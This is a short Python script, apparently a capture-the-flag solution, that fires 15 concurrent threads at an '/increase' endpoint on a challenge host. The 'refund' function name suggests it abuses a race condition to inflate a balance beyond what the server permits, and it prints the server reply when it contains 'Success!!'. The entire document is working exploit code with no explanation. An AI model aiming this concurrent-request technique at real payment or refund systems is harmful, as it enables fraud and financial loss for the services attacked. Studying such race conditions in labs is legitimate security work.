import threading
import requests


def refund():
    url = f"http://ssh.knock-on.org:10015/increase"
    res = requests.get(url=url)
    if "Success!!" in res.text:
        print(res.text)


for i in range(15):
    t = threading.Thread(target=refund)
    t.start()
